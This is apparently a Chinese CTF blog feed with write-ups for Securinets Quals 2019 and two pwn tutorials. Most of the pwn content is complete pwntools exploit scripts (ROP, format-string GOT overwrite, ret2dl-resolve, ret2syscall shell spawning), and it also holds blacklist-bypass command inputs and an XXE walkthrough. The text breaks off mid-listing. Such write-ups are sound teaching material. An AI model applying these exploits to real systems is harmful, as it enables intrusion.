&quot;tee&quot;,&quot;wget&quot;,&quot;nc&quot;,&quot;hexdump&quot;,&quot;HOSTTYPE&quot;,&quot;$&quot;,&quot;arch&quot;,&quot;env&quot;,&quot;tmp&quot;,&quot;dev&quot;,&quot;shm&quot;,&quot;lock&quot;,&quot;run&quot;,&quot;var&quot;,&quot;snap&quot;,&quot;nano&quot;,&quot;read&quot;,&quot;readlink&quot;,&quot;zcat&quot;,&quot;tailf&quot;,&quot;zcmp&quot;,&quot;zdiff&quot;,&quot;zegrep&quot;,&quot;zdiff&quot;}; char str[80], word[50];    int index;    printf(&quot;Welcome to Securinets Quals CTF \o/ \n&quot;);    printf(&quot;Enter string:\n&quot;);    read(0,str,79);for (int i=0;i&lt;sizeof(blacklist)/sizeof(blacklist[0]);i++){    index = search(str, blacklist[i]);    if (index !=  - 1)    {        delete_word(str, blacklist[i], index);    }}setreuid(geteuid(),geteuid());close(0);system(str);}</code></pre><p>我们需要做的就是想办法绕过 blacklist，然后。基础绕过方式：</p><pre><code class="bash">welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:catccat flagfflag.txtttxtsecurinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}</code></pre><p>进阶绕过方式，利用<code>*</code>通配：</p><pre><code class="bash">welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:/bin/ca* fla*securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}</code></pre><p>高级绕过方式，sed 正则匹配：</p><pre><code class="bash">welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:sed &#39;&#39; fla*securinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}</code></pre><p><a href="https://github.com/AnisBoss/CTFs/tree/master/Securinets-CTF-QUALS-2019/welcome" target="_blank" rel="noopener">官方给的 wp</a>：</p><pre><code class="bash">welcome@vps614257:~$ ./wrapperWelcome to Securinets Quals CTF o/Enter string:/lib64/ld-linux-x86-64.so.2 ./welcomesecurinets{who_needs_exec_flag_when_you_have_linker_reloaded_last_time!!!?}</code></pre><h2 id="Baby-one"><a href="#Baby-one" class="headerlink" title="Baby one"></a>Baby one</h2><pre><code>$ checksec ./baby1[*] &#39;/Users/qianfei/Desktop/baby1&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>ida 反编译出 main 函数：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [rsp+0h] [rbp-30h]  setvbuf(_bss_start, 0LL, 2, 0LL);  write(1, &quot;Welcome to securinets Quals!\n&quot;, 0x1DuLL);  return read(0, &amp;buf, 0x12CuLL);}</code></pre><p>简单的 rop，利用 <code>__libc_csu_init</code> 来 call 函数，达到泄漏和 getshell。Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *local = 0if local:    p = process(&#39;./baby1&#39;)else:    p = remote(&#39;51.254.114.246&#39;, 1111)elf = ELF(&#39;./baby1&#39;)read_plt = elf.plt[&#39;read&#39;]write_plt = elf.plt[&#39;write&#39;]read_got = elf.got[&#39;read&#39;]write_got = elf.got[&#39;write&#39;]main = elf.symbols[&#39;main&#39;]# gdb.attach(p)buf = 0x0602000-0x100#  4006a0:       4c 89 ea                mov    rdx,r13#  4006a3:       4c 89 f6                mov    rsi,r14#  4006a6:       44 89 ff                mov    edi,r15d#  4006a9:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]#  4006ad:       48 83 c3 01             add    rbx,0x1#  4006b1:       48 39 eb                cmp    rbx,rbp#  4006b4:       75 ea                   jne    4006a0 &lt;__libc_csu_init+0x40&gt;#  4006b6:       48 83 c4 08             add    rsp,0x8#  4006ba:       5b                      pop    rbx#  4006bb:       5d                      pop    rbp#  4006bc:       41 5c                   pop    r12#  4006be:       41 5d                   pop    r13#  4006c0:       41 5e                   pop    r14#  4006c2:       41 5f                   pop    r15#  4006c4:       c3                      retdef csu(rbx, rbp, r12, r13, r14, r15, addr):    payload = &#39;\x00&#39; * 56 + p64(0x4006ba) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(0x4006a0) + &#39;\x00&#39; * 56 + p64(addr)    p.sendline(payload)# payload = cyclic(500)offset = 56csu(0, 1, write_got, 8, write_got, 1, main)write = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))success(&#39;write = &#39; + hex(write))write_offset = 0x0f72b0libc_base = write - write_offsetsuccess(&#39;libc_base = &#39; + hex(libc_base))execve = libc_base + 0x0000000000cc770system = libc_base + 0x045390str_bin_sh = libc_base + 0x18cd57csu(0, 1, read_got, 16, buf, 0, main)p.send(p64(execve) + &#39;/bin/sh\x00&#39;)csu(0, 1, buf, 0, 0, buf + 8, main)p.interactive()</code></pre><h2 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h2><pre><code class="bash">root@91120f278fdd:~/ctf/2019-Securinets/pwn/Simple# checksec ./simple[*] &#39;/root/ctf/2019-Securinets/pwn/Simple/simple&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>ida 反编译 main 函数：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [rsp+0h] [rbp-50h]  unsigned __int64 v5; // [rsp+48h] [rbp-8h]  v5 = __readfsqword(0x28u);  setvbuf(_bss_start, 0LL, 2, 0LL);  read(0, &amp;buf, 0x3FuLL);  printf(&amp;buf, &amp;buf);  perror(&quot;hemm okay\n&quot;);  return __readfsqword(0x28u) ^ v5;}</code></pre><p>在 printf 处可以看到格式化字符串漏洞，基本上这道题目就是多次利用了这个漏洞。第一次我们通过格式化字符串泄漏出 libc 的地址等相关信息，同时将 perror 的 got 表改成 main。第二次把 one_gadget 填到 ret 的地址上。第三次把 perror 的 got 表改回去，然后程序会直接 ret 到 one_gadget。Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;local = 1if local:    p = process(&#39;./simple&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    one_gadget_offset = 0x4f322else:    p = remote(&#39;51.254.114.246&#39;, 4444)    libc = ELF(&#39;libc.so.6&#39;)    one_gadget_offset = 0x4526aelf = ELF(&#39;./simple&#39;)main = elf.symbols[&#39;main&#39;]perror_got = elf.got[&#39;perror&#39;]read_got = elf.got[&#39;read&#39;]payload = &#39;%14$p%10$s%1682c%9$hn&#39;payload += &#39;\x00&#39; * (24 - len(payload))payload += p64(perror_got)payload += p64(read_got)p.send(payload)leak = p.recv()offset = 0xd8ret = int(leak[0:14], 16) - offsetread = u64(leak[14:20].ljust(8, &#39;\x00&#39;))success(&#39;read = &#39; + hex(read))libc_base = read - libc.symbols[&#39;read&#39;]success(&#39;libc_base = &#39; + hex(libc_base))one_gadget = libc_base + one_gadget_offseta0 = one_gadget &amp; 0xffffa1 = ((one_gadget &amp; 0xffff0000) &gt;&gt; 16)a1 = (a1 - a0 - 1) % 0x10000 + 1payload = &#39;%{}c%{}$hn&#39;.format(a0, 10)payload += &#39;%{}c%{}$hn&#39;.format(a1, 11)payload += &#39;\x00&#39; * (32 - len(payload))payload += p64(ret)payload += p64(ret + 2)p.sendline(payload)payload = &#39;%1430c%8$hn&#39;payload += &#39;\x00&#39; * (16 - len(payload))payload += p64(perror_got)p.sendline(payload)p.interactive()</code></pre><h2 id="Baby-Two"><a href="#Baby-Two" class="headerlink" title="Baby Two"></a>Baby Two</h2><pre><code class="bash">$ checksec ./baby2[*] &#39;/Users/qianfei/ctf/ctf/2019-Securinets/pwn/Baby-Two/baby2&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>ida 反编译 main 函数：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [esp+8h] [ebp-30h]  setvbuf(_bss_start, 0, 2, 0);  return read(0, &amp;buf, 0x12Cu);}</code></pre><p>只有一个 <code>read</code>，没有泄漏，那就是用 return-to-dl-runtime-resolve，构造 <code>.dynstr</code> 和 <code>.dynsym</code> 来获取 system。这道题应该是用 gcc-4.9 或者更高版本的编译的，溢出这边会用栈上的一个值通过 ecx 来存 esp 的值，直接溢出会让栈毁掉。办法是用 Off-by-One 的思路溢出最后 ecx 的最后一个字节来爆破。下面是不开 ASLR 的版本：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./baby2&#39;)elf = ELF(&#39;./baby2&#39;)buf = elf.symbols[&#39;useless&#39;] # 0x804a040plt0 = 0x8048320pop3_ret = 0x08048509# readelf -a ./baby2 | grep .dynamic#   [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4dynamic = 0x08049f14# readelf -a ./baby2 | grep .rel.plt#   [10] .rel.plt          REL             080482d8 0002d8 000018 08  AI  5  24  4relplt = 0x080482d8# readelf -a ./baby2 | grep SYMTAB#  0x00000006 (SYMTAB)                     0x80481d0dynsym = 0x80481d0# readelf -a ./baby2 | grep STRTAB#  0x00000005 (STRTAB)                     0x8048240dynstr = 0x8048240#gdb.attach(p, &#39;b *0x80484a7\nc&#39;)def read(addr, size): # addr=&gt;+12 ; size=&gt;+16    return p32(read_plt) + p32(pop3_ret) + p32(0) + p32(addr) + p32(size)reloc_arg = buf - relpltpayload = cyclic(100)payload = (    read(buf, 0x100) +    p32(plt0) +    p32(reloc_arg) +    p32(0xdeadbeef) +    p32(buf + 40) # &amp;&quot;/bin/sh\x00&quot;).ljust(44, &#39;\x00&#39;)payload += &#39;\x9C&#39; # overflow ecxp.send(payload)pause()padding_size = 16 - ((buf + 8 - dynsym) % 16) # 8payload = ( # buf    # Elf32_Rel    p32(buf) + # r_offset    p32(0x7 | (((buf + 8 + padding_size - dynsym) / 16) &lt;&lt; 8)) + # r_info    &#39;A&#39; * padding_size + # padding    # Elf32_Sym    p32(buf + 32 - dynstr) + # st_name    p32(0) + # st_value    p32(0) + # st_size    p32(0x12) + # st_info    # buf+32    &#39;system\x00\x00&#39; + &#39;/bin/sh\x00&#39;)p.sendline(payload)p.interactive()</code></pre><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Feedback"><a href="#Feedback" class="headerlink" title="Feedback"></a>Feedback</h2><p>这是一道 XXE，通过 burpsuite 抓包，然后直接利用<a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection" target="_blank" rel="noopener">网上的 exp</a>看到：</p><p><img src="/pics/2019-Securinets-CTF-Quals/4.png" srcset="/img/loading.gif" alt></p><p>然后同理，看到有 simple_user 这个用户，尝试看看能不能在家目录拿到 flag：</p><p><img src="/pics/2019-Securinets-CTF-Quals/5.png" srcset="/img/loading.gif" alt></p><p>发现没有，再试试 apche 根目录：</p><p><img src="/pics/2019-Securinets-CTF-Quals/6.png" srcset="/img/loading.gif" alt></p><p>还是不行。发现网站是 nginx 搭的，就 google 一下 <a href="https://stackoverflow.com/questions/10674867/nginx-default-public-www-location" target="_blank" rel="noopener">nginx 的默认 www 目录</a>：</p><p><img src="/pics/2019-Securinets-CTF-Quals/7.png" srcset="/img/loading.gif" alt></p><p>然后可以看到 root 的路径，尝试获得 flag：</p><p><img src="/pics/2019-Securinets-CTF-Quals/8.png" srcset="/img/loading.gif" alt></p><h1 id="Foren"><a href="#Foren" class="headerlink" title="Foren"></a>Foren</h1><h2 id="Easy-Trade"><a href="#Easy-Trade" class="headerlink" title="Easy Trade"></a>Easy Trade</h2><p>用 wireshark 打开给的 pcap 包，总共只有几十条信息，可以一条条看下来。首先可以看到给出的 key：</p><p><img src="/pics/2019-Securinets-CTF-Quals/9.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2019-Securinets-CTF-Quals/10.png" srcset="/img/loading.gif" alt></p><p>然后再往下看可以找到一个 PK 头的 zip，看得到里面有 <code>flag.txt</code>：</p><p><img src="/pics/2019-Securinets-CTF-Quals/11.png" srcset="/img/loading.gif" alt></p><p>拿到 <code>flag.txt</code> 的内容后 base64 解密一下拿到 flag：</p><pre><code class="shell">$ cat datasecurinetsXD$ unzip flag.zipArchive:  flag.zip[flag.zip] flag.txt password: extracting: flag.txt$ cat flag.txt | base64 -Dsecurinets{954f670cb291ec276b1a9ff8453ea60%</code></pre><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="HIDDEN"><a href="#HIDDEN" class="headerlink" title="HIDDEN"></a>HIDDEN</h2><p>题目提示了在 url 栏中有些不一样的地方。可以看到这个网站用了 http 而不是 https：</p><p><img src="/pics/2019-Securinets-CTF-Quals/12.png" srcset="/img/loading.gif" alt></p><p>点开后在证书中看到 flag：</p><p><img src="/pics/2019-Securinets-CTF-Quals/13.png" srcset="/img/loading.gif" alt></p><h2 id="EZ"><a href="#EZ" class="headerlink" title="EZ"></a>EZ</h2><p>图片隐写，<a href="https://stylesuxx.github.io/steganography/" target="_blank" rel="noopener">在线解密一下</a>：</p><pre><code>--START--&quot;The fact is that upon his entrance I had instantly recognized the extremepersonal danger in which I lay. The only conceivable escape for him lay in silencingmy tongue. In an instant I had slipped the revolver from the drawer into mypocket and was covering him through the cloth. At his remark I drew the weaponout and laid it cocked upon the table. He still smiled and blinked, but there wassomething about his eyes which made me feel very glad that I had it there,&quot;You evidently don&#39;t know me,&#39; said he.&quot;&#39;On the contrary,&#39; I answered, &#39;I think it is fairly evident that I do. Pray takea chair. I can spare you five minutes if you have anything to say.&#39;&quot;&#39;All that I have to say has already crossed your mind,&#39; said he.&quot;&#39;Then possibly my answer has crossed yours,&#39; I replied.&quot;&#39;You stand fast?&#39;&quot;&#39;Absolutely.&#39;&quot;He clapped his hand into his pocket, and I raised the pistol from the table.But he merely drew out a &lt;DETELED_WORD&gt; in which he had scribbled somedates.&quot;You crossed my path on the fourth of January,&#39; said he. &#39;On the twenty-thirdyou incommoded me; by the middle of February I was seriously inconveniencedby you; at the end of March I was absolutely hampered in my plans; and now, atthe close of April, I find myself placed in such a position through your continualpersecution that I am in positive danger of losing my liberty. The situation isbecoming an impossible one.&#39;&quot;&#39;Have you any suggestion to make?&#39; I asked.&quot;&#39;You must drop it, Mr. Holmes,&#39; said he, swaying his face about. &#39;You reallymust, you know.&#39;&quot;--END--;</code></pre><p>可以看到有一个单词被删掉了，根据题目提示我们需要找到这个单词。google 之后发现是<a href="https://www.pagebypagebooks.com/Arthur_Conan_Doyle/Memoirs_of_Sherlock_Holmes/Adventure_XI_The_Final_Problem_p4.html" target="_blank" rel="noopener">福尔摩斯的一个片段</a>，找到单词之后，<a href="http://www.sha1-online.com/" target="_blank" rel="noopener">在线 sha1</a> 哈希一下得到 flag。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/" target="_blank" rel="noopener">http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/</a><br><a href="https://www.youtube.com/watch?v=r23Yk2lutJ0&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=r23Yk2lutJ0&amp;feature=youtu.be</a><br><a href="https://ptr-yudai.hatenablog.com/entry/2019/03/25/152043" target="_blank" rel="noopener">https://ptr-yudai.hatenablog.com/entry/2019/03/25/152043</a><br><a href="https://www.rootnetsec.com/securinets-prequals-automateme/" target="_blank" rel="noopener">https://www.rootnetsec.com/securinets-prequals-automateme/</a><br><a href="https://ctftime.org/writeup/14075" target="_blank" rel="noopener">https://ctftime.org/writeup/14075</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Buffer Overflow with gcc&gt;=4.9</title>
    <link href="/2019/03/17/Buffer-Overflow-with-gcc-4-9/"/>
    <url>/2019/03/17/Buffer-Overflow-with-gcc-4-9/</url>
    
    <content type="html"><![CDATA[<p>gcc 的版本如果大于 4.9，main 函数下的缓冲区溢出会有不一样的 check，即使没开 canary，也不能溢出。</p><a id="more"></a><h1 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h1><p>自己写的一道题目，源码：</p><pre><code class="cpp">// gcc p3.c -o p3 -m32 -static -fno-stack-protector -g#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main() {    setvbuf(stdin, 0, 2, 0);    setvbuf(stdout, 0, 2, 0);    setvbuf(stderr, 0, 2, 0);    char buf[200];    printf(&quot;say something: &quot;);    gets(buf);    return 0;}</code></pre><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>乍一看是静态编译，然后又是 gets，一定是很容易的栈溢出，但是大于 4.9 版本的 gcc 是不太一样的。main 函数中是这样的：</p><pre><code>0804887c &lt;main&gt;: 804887c:       8d 4c 24 04             lea    ecx,[esp+0x4] 8048880:       83 e4 f0                and    esp,0xfffffff0 8048883:       ff 71 fc                push   DWORD PTR [ecx-0x4] 8048886:       55                      push   ebp 8048887:       89 e5                   mov    ebp,esp 8048889:       51                      push   ecx 804888a:       81 ec d4 00 00 00       sub    esp,0xd4 ...... 80488eb:       83 c4 10                add    esp,0x10 80488ee:       b8 00 00 00 00          mov    eax,0x0 80488f3:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4] 80488f6:       c9                      leave 80488f7:       8d 61 fc                lea    esp,[ecx-0x4] 80488fa:       c3                      ret</code></pre><p>这里我们可以看到，程序在对栈的保存上，额外使用了 ecx 来保存栈上的某个值。当我们尝试栈溢出的时候，会覆盖到 ecx 上，导致最后恢复的栈值不存在。通过 gdb 调试我们可以看得更清楚：</p><pre><code>────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────EAX: 0x804887c (&lt;main&gt;:    lea    ecx,[esp+0x4])EBX: 0x80481a8 (&lt;_init&gt;:    push   ebx)ECX: 0xffffcd90 --&gt; 0x1EDX: 0xffffcdb4 --&gt; 0x80481a8 (&lt;_init&gt;:    push   ebx)ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;:    mov    edx,DWORD PTR [esp+0x4])EDI: 0x0EBP: 0xffffcd78 --&gt; 0x0ESP: 0xffffcc94 --&gt; 0x2c0003fEIP: 0x8048893 (&lt;main+23&gt;:    push   0x80bb288)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)───────────────────────────────────────────────────────────────────── Code ────────────────────────────────────────────────────────────────────   0x8048889 &lt;main+13&gt;:    push   ecx   0x804888a &lt;main+14&gt;:    sub    esp,0xd4   0x8048890 &lt;main+20&gt;:    sub    esp,0xc=&gt; 0x8048893 &lt;main+23&gt;:    push   0x80bb288   0x8048898 &lt;main+28&gt;:    call   0x804ed60 &lt;printf&gt;   0x804889d &lt;main+33&gt;:    add    esp,0x10   0x80488a0 &lt;main+36&gt;:    sub    esp,0xc   0x80488a3 &lt;main+39&gt;:    lea    eax,[ebp-0xd0]──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────0000| 0xffffcc94 --&gt; 0x2c0003f0004| 0xffffcc98 --&gt; 0xfff0008| 0xffffcc9c --&gt; 0x00012| 0xffffcca0 --&gt; 0x00016| 0xffffcca4 --&gt; 0x5b (&#39;[&#39;)0020| 0xffffcca8 --&gt; 0x00024| 0xffffccac --&gt; 0xf0b5ff0028| 0xffffccb0 --&gt; 0xffffccee --&gt; 0xe6ce0000───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Legend: code, data, rodata, heap, value0x08048893    7        printf(&quot;say something: &quot;);assassinq&gt;&gt; p $ecx$1 = 0xffffcd90......────────────────────────────────────────────────────────────────── Registers ──────────────────────────────────────────────────────────────────EAX: 0x0EBX: 0x80481a8 (&lt;_init&gt;:    push   ebx)ECX: 0x42424242 (&#39;BBBB&#39;)EDX: 0x80eb4e0 --&gt; 0x0ESI: 0x80ea00c --&gt; 0x8067020 (&lt;__strcpy_sse2&gt;:    mov    edx,DWORD PTR [esp+0x4])EDI: 0x0EBP: 0xffffcd78 --&gt; 0x0ESP: 0xffffcca0 --&gt; 0x0EIP: 0x80488ba (&lt;main+62&gt;:    leave)EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)───────────────────────────────────────────────────────────────────── Code ────────────────────────────────────────────────────────────────────   0x80488af &lt;main+51&gt;:    add    esp,0x10   0x80488b2 &lt;main+54&gt;:    mov    eax,0x0   0x80488b7 &lt;main+59&gt;:    mov    ecx,DWORD PTR [ebp-0x4]=&gt; 0x80488ba &lt;main+62&gt;:    leave   0x80488bb &lt;main+63&gt;:    lea    esp,[ecx-0x4]   0x80488be &lt;main+66&gt;:    ret   0x80488bf:    nop   0x80488c0 &lt;generic_start_main&gt;:    push   esi──────────────────────────────────────────────────────────────────── Stack ────────────────────────────────────────────────────────────────────0000| 0xffffcca0 --&gt; 0x00004| 0xffffcca4 --&gt; 0x5b (&#39;[&#39;)0008| 0xffffcca8 (&#39;A&#39; &lt;repeats 200 times&gt;...)0012| 0xffffccac (&#39;A&#39; &lt;repeats 200 times&gt;...)0016| 0xffffccb0 (&#39;A&#39; &lt;repeats 196 times&gt;, &quot;BBBB&quot;)0020| 0xffffccb4 (&#39;A&#39; &lt;repeats 192 times&gt;, &quot;BBBB&quot;)0024| 0xffffccb8 (&#39;A&#39; &lt;repeats 188 times&gt;, &quot;BBBB&quot;)0028| 0xffffccbc (&#39;A&#39; &lt;repeats 184 times&gt;, &quot;BBBB&quot;)───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Legend: code, data, rodata, heap, value0x080488ba    10    }assassinq&gt;&gt; p $ecx$2 = 0x42424242</code></pre><p>显然 ecx 的作用是使得 esp 恢复到原来的值，那么如果我们破坏了 esp，那么会造成奇怪的影响。既然 ecx 无法覆盖，那么我们就需要想办法绕过它。在上面调试的过程中，我们发现 ecx 的最低两个字节是 0x90，如果我们把它改成 00，那么我们的栈就会往下掉 0x90 个字节，我们输入的 buf 就能有用武之地。由于这里输入使用的是 gets，采用的是 0x00 截断我们的输入，我们可以充分利用这个特点，达到我们的目的。</p><p>这个程序是静态编译的，可以使用 ret2syscall。我们把 rop 填在 buf 的最后面，前面则填满一个 ret 的 gadget，这样的话只要 ecx 保存的地址低两位大于我们 rop 的长度，就有概率成功打通。</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;i386&#39;local = 1if local:    p = process(&#39;./p3&#39;)else:    p = remote(&#39;10.21.13.69&#39;, 10016)elf = ELF(&#39;./p3&#39;)g = lambda x: next(elf.search(asm(x)))ret = g(&#39;ret&#39;)info(&#39;ret = &#39; + hex(ret))pop_eax_ret = g(&#39;pop eax ; ret&#39;)pop_ebx_ret = g(&#39;pop ebx ; ret&#39;)pop_ecx_ret = g(&#39;pop ecx ; ret&#39;)pop_edx_ret = g(&#39;pop edx ; ret&#39;)int_0x80_ret = g(&#39;int 0x80 ; ret&#39;)buf = 0x080eb000 - 100# gdb.attach(p)offset = 204# read(0, &#39;/bin/sh\x00&#39;, 100)rop1 = [    pop_eax_ret,    3,    pop_ebx_ret,    0,    pop_ecx_ret,    buf,    pop_edx_ret,    100,    int_0x80_ret,]# execve(&#39;/bin/sh\x00&#39;, 0, 0)rop2 = [    pop_eax_ret,    0xb,    pop_ebx_ret,    buf,    pop_ecx_ret,    0,    pop_edx_ret,    0,    int_0x80_ret]rop = &#39;&#39;.join(map(p32, rop1 + rop2))info(&#39;len(rop) = &#39; + str(len(rop)))offset2 = offset - len(rop)info(&#39;offset2 = &#39; + str(offset2))payload = p32(ret) * (offset2 / 4) + ropinfo(&#39;len(payload) = &#39; + str(len(payload)))# payload = cyclic(500)p.sendline(payload)p.sendline(&#39;/bin/sh\x00&#39;)p.interactive()</code></pre><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.youtube.com/watch?v=9bHibgrjNlc" target="_blank" rel="noopener">【ctf-pwn】【winesap】STCS 2016 Week4</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gets一把梭</title>
    <link href="/2019/03/07/Gets%E4%B8%80%E6%8A%8A%E6%A2%AD/"/>
    <url>/2019/03/07/Gets%E4%B8%80%E6%8A%8A%E6%A2%AD/</url>
    
    <content type="html"><![CDATA[<p>如果程序只有一个 <code>gets()</code>。</p><a id="more"></a><h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><p>checksec：</p><pre><code>[*] &#39;/home/assassinq/pwn/r3t/GETS/gets&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h1 id="Main-Function"><a href="#Main-Function" class="headerlink" title="Main Function"></a>Main Function</h1><p>只有一个 main 函数，就给了一个 <code>gets()</code>：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [rsp+0h] [rbp-10h]  gets(&amp;v4, argv, envp);  return 0;}</code></pre><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>这道题的思路主要是泄漏出 gets 的真实地址，然后利用给出的 libc 计算出 gets 与 system 之间的 offset 得到 system 的地址，最后读入 sh，执行 system 拿到 shell。</p><h1 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h1><p>先放上会用到的 gadgets：</p><pre><code class="python">g = lambda x: next(elf.search(asm(x)))pop_rsp_r13_r14_r15_ret = g(&#39;pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret&#39;)pop_rbp_ret = g(&#39;pop rbp ; ret&#39;)pop_rdi_ret = g(&#39;pop rdi ; ret&#39;)pop_r15_ret = g(&#39;pop r15 ; ret&#39;)pop_rsi_r15_ret = g(&#39;pop rsi ; pop r15 ; ret&#39;)pop_rbp_r14_r15_ret = g(&#39;pop rbp ; pop r14 ; pop r15 ; ret&#39;)pop_rbx_rbp_r12_r13_r14_r15_ret = g(&#39;pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&#39;)add_ebx_esi_ret = g(&#39;add ebx, esi ; ret&#39;)leave_ret = g(&#39;leave ; ret&#39;)call_at_r12 = g(&#39;call QWORD PTR [r12+rbx*8]&#39;)</code></pre><h1 id="Buf"><a href="#Buf" class="headerlink" title="Buf"></a>Buf</h1><p>因为操作很多，我们需要通过栈迁移来达到目的，所以使用了很多 bss 段上的空间：</p><pre><code class="python">bss = 0x602000buf1 = bss - 0x100buf2 = bss - 0x200buf3 = bss - 0x300buf4 = bss - 0x400buf5 = bss - 0x500buf6 = bss - 0x600buf7 = bss - 0x700buf8 = bss - 0x800</code></pre><h1 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h1><p>第一个 rop 将所有的 buf 用 gets 读上来。并且最后通过 <code>leave ; ret</code> 跳到 buf1 上：</p><pre><code class="python">rop1 = [    pop_rdi_ret, buf1, gets_plt, # rop2    pop_rdi_ret, buf2, gets_plt, # rop4    pop_rdi_ret, buf3, gets_plt, # rop5    pop_rdi_ret, buf4, gets_plt, # rop7    pop_rdi_ret, buf5, gets_plt, # rop9    pop_rdi_ret, buf6, gets_plt, # rop10    pop_rdi_ret, buf7, gets_plt, # rop13    pop_rbp_ret, buf1 - 8, leave_ret]</code></pre><p>第二个 rop 为我们读入 buf1 的内容。先看看这里 gets 的 got 表处的情况：</p><pre><code class="asm">.got.plt:0000000000601020 off_601020      dq offset gets          ; DATA XREF: _gets↑r.got.plt:0000000000601020 _got_plt        ends.got.plt:0000000000601020.data:0000000000601028 ; ===========================================================================.data:0000000000601028.data:0000000000601028 ; Segment type: Pure data.data:0000000000601028 ; Segment permissions: Read/Write.data:0000000000601028 ; Segment alignment &#39;qword&#39; can not be represented in assembly.data:0000000000601028 _data           segment para public &#39;DATA&#39; use64.data:0000000000601028                 assume cs:_data.data:0000000000601028                 ;org 601028h.data:0000000000601028                 public __data_start ; weak.data:0000000000601028 __data_start    db    0                 ; Alternative name is &#39;__data_start&#39;.data:0000000000601028                                         ; data_start.data:0000000000601029                 db    0.data:000000000060102A                 db    0</code></pre><p>got 表在这里是只读的，但在后面的 data 段是可写的。我们可以先在 gets 地址后面 24byte 的地方填上 <code>leave ; ret</code>，然后为跳转到 buf2 提前设好 rbp。最后利用 <code>pop_rsp_r13_r14_r15_ret</code> 把 gets 的地址放到 r13 上。前面可以。同时接上第三个 rop 送上去的 <code>leave_ret</code>：</p><pre><code class="python">rop2 = [ # buf1    pop_rdi_ret, gets_got + 24, gets_plt, # rop3    pop_rbp_ret, buf2 - 8,    pop_rsp_r13_r14_r15_ret, gets_got]rop3 = [ # gets_got + 24    leave_ret]</code></pre><p>然后接下来需要用到 <code>__libc_csu_init()</code> 这个函数：</p><pre><code class="asm">.text:0000000000400550 ; void _libc_csu_init(void).text:0000000000400550                 public __libc_csu_init.text:0000000000400550 __libc_csu_init proc near               ; DATA XREF: _start+16↑o.text:0000000000400550 ; __unwind {.text:0000000000400550                 push    r15.text:0000000000400552                 push    r14.text:0000000000400554                 mov     r15d, edi.text:0000000000400557                 push    r13.text:0000000000400559                 push    